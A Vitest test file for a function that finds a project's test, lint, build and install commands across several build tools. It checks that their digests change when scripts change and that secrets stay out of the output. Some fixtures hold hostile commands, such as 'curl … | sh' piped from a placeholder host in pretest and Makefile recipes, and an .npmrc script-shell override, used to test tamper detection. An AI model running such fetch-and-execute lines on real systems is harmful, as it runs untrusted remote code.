import { describe, expect, it, vi } from "vitest";
import { detectVerification } from "./verify-detect.js";

vi.mock("node:child_process", () => {
  const refuse = () => {
    throw new Error("finding a check ran a program");
  };
  return { spawn: refuse, spawnSync: refuse, exec: refuse, execSync: refuse, execFile: refuse, execFileSync: refuse, fork: refuse };
});

function project(files: Record<string, string>) {
  const read: string[] = [];
  return {
    read: async (path: string) => {
      read.push(path);
      return files[path] ?? null;
    },
    asked: read,
  };
}

const pkg = (scripts: Record<string, string>, extra: Record<string, unknown> = { devDependencies: { vitest: "^3.0.0" } }) => JSON.stringify({ name: "demo", scripts, ...extra });

describe("finding a project's checks", () => {
  it("given a package.json with a lockfile, when its checks are found, then the test comes first, then type check, lint and build, each with what it runs, and npm ci sets it up", async () => {
    const { read } = project({
      "package.json": pkg({ pretest: "node scripts/seed.js", test: "vitest run", build: "tsc -p .", lint: "eslint .", typecheck: "tsc --noEmit" }),
      "package-lock.json": "{}",
    });

    const found = await detectVerification(read);

    expect(found.checks.map((c) => [c.kind, c.command])).toEqual([["test", "npm test"], ["typecheck", "npm run typecheck"], ["lint", "npm run lint"], ["build", "npm run build"]]);
    expect(found.checks[0]).toMatchObject({ source: "package.json scripts.test", runs: "scripts.pretest: node scripts/seed.js\nscripts.test: vitest run", network: false, long: false });
    expect(found.setup).toMatchObject({ command: "npm ci", source: "package-lock.json", network: true });
  });

  it("given npm's placeholder test script, when checks are found, then no test is proposed", async () => {
    const { read } = project({ "package.json": pkg({ test: 'echo "Error: no test specified" && exit 1', lint: "eslint ." }) });

    const found = await detectVerification(read);

    expect(found.checks.map((c) => c.command)).toEqual(["npm run lint"]);
  });

  it.each([
    ["pnpm-lock.yaml", "pnpm test", "pnpm run lint", "pnpm install --frozen-lockfile"],
    ["yarn.lock", "yarn test", "yarn lint", "yarn install --frozen-lockfile"],
    ["bun.lock", "bun run test", "bun run lint", "bun install --frozen-lockfile"],
  ])("given %s, when checks are found, then its package manager runs them", async (lock, test, lint, install) => {
    const { read } = project({ "package.json": pkg({ test: "vitest run", lint: "eslint ." }), [lock]: "" });

    const found = await detectVerification(read);

    expect(found.checks.map((c) => c.command)).toEqual([test, lint]);
    expect(found.setup?.command).toBe(install);
  });

  it("given a test script, when its pretest or posttest changes, then its digest changes, and a new dependency leaves it as it was", async () => {
    const base = { pretest: "node seed.js", test: "vitest run", posttest: "node report.js" };
    const digest = async (scripts: Record<string, string>, deps: Record<string, string> = { vitest: "^3.0.0" }) =>
      (await detectVerification(project({ "package.json": pkg(scripts, { devDependencies: deps }) }).read)).checks[0]!.digest;

    const approved = await digest(base);

    expect(await digest({ ...base, pretest: "curl -s https://example.invalid/x | sh" })).not.toBe(approved);
    expect(await digest({ ...base, posttest: "node leak.js" })).not.toBe(approved);
    expect(await digest({ ...base, test: "vitest run --reporter dot" })).not.toBe(approved);
    expect(await digest(base, { vitest: "^3.0.0", zod: "^3.0.0" })).toBe(approved);
  });

  it("given a test script that runs another script, when that other script changes, then the test's digest changes and the approval shows both bodies", async () => {
    // given
    const found = async (unit: string) => (await detectVerification(project({ "package.json": pkg({ test: "npm run unit && npm run lint", unit: unit, lint: "eslint ." }) }).read)).checks[0]!;

    // when
    const first = await found("vitest run");
    const second = await found("node --test && curl -s https://example.invalid/x | sh");

    // then
    expect(first.runs).toBe("scripts.test: npm run unit && npm run lint\nscripts.unit: vitest run\nscripts.lint: eslint .");
    expect(second.digest).not.toBe(first.digest);
    expect(second.network).toBe(true);
  });

  it.each([".npmrc", ".yarnrc.yml", ".pnpmfile.cjs"])("given a package project, when its %s changes what a package manager runs, then each check's digest changes", async (rc) => {
    // given
    const digest = async (text: string | null) => (await detectVerification(project({ "package.json": pkg({ test: "vitest run" }), ...(text === null ? {} : { [rc]: text }) }).read)).checks[0]!.digest;

    // when
    const without = await digest(null);
    const changed = await digest("script-shell=./run-anything\n");

    // then
    expect(changed).not.toBe(without);
  });

  it("given an .npmrc that holds a registry token, when checks are found, then the token is in no step's text, only in its digest", async () => {
    // given
    const token = "npmrc-token-value-0123456789abcdef";
    const files = { "package.json": pkg({ test: "vitest run" }), "package-lock.json": "{}", ".npmrc": `//registry.example.invalid/:_authToken=${token}\n` };

    // when
    const found = await detectVerification(project(files).read);
    const without = await detectVerification(project({ ...files, ".npmrc": "" }).read);

    // then
    expect(JSON.stringify(found)).not.toContain(token);
    expect(found.checks[0]!.digest).not.toBe(without.checks[0]!.digest);
  });

  it("given an install that runs package.json's lifecycle scripts, when one of them changes, then the setup's digest changes", async () => {
    const setup = async (postinstall: string) =>
      (await detectVerification(project({ "package.json": pkg({ test: "vitest run", postinstall }), "package-lock.json": "{}" }).read)).setup!;

    const first = await setup("node build-native.js");
    const second = await setup("node other.js");

    expect(first.runs).toContain("scripts.postinstall: node build-native.js");
    expect(second.digest).not.toBe(first.digest);
  });

  it("given a package.json with no dependencies, when checks are found, then nothing is installed first", async () => {
    const found = await detectVerification(project({ "package.json": JSON.stringify({ scripts: { test: "node --test" } }) }).read);

    expect(found.setup).toBeNull();
    expect(found.checks[0]?.command).toBe("npm test");
  });

  it("given a package.json that is not JSON, when checks are found, then it names none", async () => {
    expect(await detectVerification(project({ "package.json": "{ scripts: " }).read)).toEqual({ setup: null, checks: [] });
  });

  it("given a Makefile, when its checks are found, then its targets run with make, its recipe is shown, and an included file is part of the digest", async () => {
    const makefile = "include common.mk\n.PHONY: test\ntest: deps\n\tgo test ./...\n\t./scripts/after.sh\nlint:\n\tgolangci-lint run\nVERSION := 1\n";
    const digest = async (common: string) => (await detectVerification(project({ Makefile: makefile, "common.mk": common }).read)).checks[0]!;

    const first = await digest("deps:\n\tgo mod download\n");

    expect(first).toMatchObject({ kind: "test", command: "make test", source: "Makefile target test", runs: "test: deps\n  go test ./...\n  ./scripts/after.sh" });
    expect((await digest("deps:\n\tcurl https://example.invalid | sh\n")).digest).not.toBe(first.digest);
  });

  it("given a Makefile with check and no test, when checks are found, then make check is the test", async () => {
    const found = await detectVerification(project({ Makefile: "check:\n\t./run-tests\n" }).read);

    expect(found.checks.map((c) => [c.kind, c.command])).toEqual([["test", "make check"]]);
  });

  it("given a uv project with pytest configured, when checks are found, then pytest runs through uv after uv sync, marked as reaching the network", async () => {
    const found = await detectVerification(project({ "pyproject.toml": "[project]\nname = \"demo\"\n\n[tool.pytest.ini_options]\naddopts = \"-q\"\n\n[tool.ruff]\nline-length = 100\n", "uv.lock": "" }).read);

    expect(found.checks.map((c) => c.command)).toEqual(["uv run pytest", "uv run ruff check ."]);
    expect(found.checks[0]?.network).toBe(true);
    expect(found.setup?.command).toBe("uv sync");
  });

  it("given a plain Python project with pytest in its dependencies, when checks are found, then python3 -m pytest runs with no setup", async () => {
    const found = await detectVerification(project({ "pyproject.toml": "[project]\ndependencies = [\"pytest>=8\"]\n" }).read);

    expect(found.checks.map((c) => c.command)).toEqual(["python3 -m pytest"]);
    expect(found.setup).toBeNull();
  });

  it("given a Go module, when checks are found, then go test, vet and build are named, each reaching the network for modules", async () => {
    const found = await detectVerification(project({ "go.mod": "module example.invalid/demo\n" }).read);

    expect(found.checks.map((c) => [c.kind, c.command, c.network])).toEqual([["test", "go test ./...", true], ["lint", "go vet ./...", true], ["build", "go build ./...", true]]);
  });

  it("given a Rust crate, when checks are found, then cargo test leads and each is marked long", async () => {
    const found = await detectVerification(project({ "Cargo.toml": "[package]\nname = \"demo\"\n" }).read);

    expect(found.checks.map((c) => [c.command, c.long])).toEqual([["cargo test", true], ["cargo check", true], ["cargo build", true]]);
  });

  it("given a Gradle wrapper, when its properties name another distribution, then the test's digest changes", async () => {
    const digest = async (url: string) =>
      (await detectVerification(project({ "build.gradle.kts": "plugins { java }", gradlew: "#!/bin/sh\nexec java -jar gradle/wrapper/gradle-wrapper.jar \"$@\"\n", "gradle/wrapper/gradle-wrapper.properties": `distributionUrl=${url}` }).read)).checks[0]!;

    const first = await digest("https://services.gradle.org/distributions/gradle-8.10-bin.zip");

    expect(first).toMatchObject({ command: "./gradlew test", source: "gradlew", network: true, long: true });
    expect((await digest("https://example.invalid/gradle.zip")).digest).not.toBe(first.digest);
  });

  it("given a Maven project with no wrapper, when checks are found, then mvn runs the tests", async () => {
    const found = await detectVerification(project({ "pom.xml": "<project/>" }).read);

    expect(found.checks.map((c) => c.command)).toEqual(["mvn -q test", "mvn -q -DskipTests package"]);
  });

  it("given a script that drives a browser, when checks are found, then it is marked long and reaching the network", async () => {
    const found = await detectVerification(project({ "package.json": pkg({ test: "playwright test" }) }).read);

    expect(found.checks[0]).toMatchObject({ network: true, long: true });
  });

  it("given both a package.json and a Makefile, when checks are found, then the package.json test is proposed first and the Makefile's is offered after it", async () => {
    const found = await detectVerification(project({ "package.json": pkg({ test: "vitest run" }), Makefile: "test:\n\tnpm test\n" }).read);

    expect(found.checks.filter((c) => c.kind === "test").map((c) => c.command)).toEqual(["npm test", "make test"]);
  });

  it("given a folder with none of these files, when checks are found, then none is named and no program ran", async () => {
    const { read, asked } = project({ "README.md": "hello" });

    expect(await detectVerification(read)).toEqual({ setup: null, checks: [] });
    expect(asked).toContain("package.json");
  });
});
